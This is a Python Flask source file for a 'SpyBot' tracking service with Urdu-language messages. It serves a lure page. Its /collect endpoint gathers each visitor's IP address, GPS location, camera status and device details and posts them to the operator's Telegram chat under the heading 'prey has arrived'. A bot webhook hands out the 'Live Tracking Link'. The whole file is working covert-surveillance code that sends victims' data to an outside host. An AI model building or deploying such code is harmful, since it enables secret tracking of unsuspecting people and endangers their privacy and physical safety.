from flask import Flask, request, render_template
import requests
import os

app = Flask(__name__, static_url_path='/static', static_folder='static', template_folder='templates')

# === Telegram Bot Configuration ===
BOT_TOKEN = "آپ_کا_Token"
CHAT_ID = "آپ_کا_ChatID"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# === HTML Page ===
@app.route('/')
def index():
    return render_template("spy.html")

# === Data Collector ===
@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = data.get("userAgent", "Unknown")
    lat = data.get("latitude")
    lon = data.get("longitude")
    cam = data.get("camera", "❌")
    device = data.get("deviceInfo", "Unknown")
    loc_url = f"https://maps.google.com?q={lat},{lon}" if lat and lon else "❌ Location Not Available"

    message = f"""
👁️ شکار آیا!
🌐 IP Address: {ip}
📱 Device: {ua}
📍 Location: {loc_url}
📷 Camera: {cam}
🧠 Device Info: {device}
"""
    requests.post(f"{API_URL}/sendMessage", data={
        "chat_id": CHAT_ID,
        "text": message
    })
    return "OK", 200

# === Bot Welcome ===
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def webhook():
    update = request.get_json()
    if "message" in update and "text" in update["message"]:
        chat_id = update["message"]["chat"]["id"]
        text = update["message"]["text"]
        if text.strip() == "/start":
            reply = (
                "👋 خوش آمدید Faizan™ SpyBot میں!\n"
                "📡 Live Tracking Link:\n"
                f"https://faizan-spybot.onrender.com"
            )
            requests.post(f"{API_URL}/sendMessage", data={
                "chat_id": chat_id,
                "text": reply
            })
    return "ok", 200

# === Start ===
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
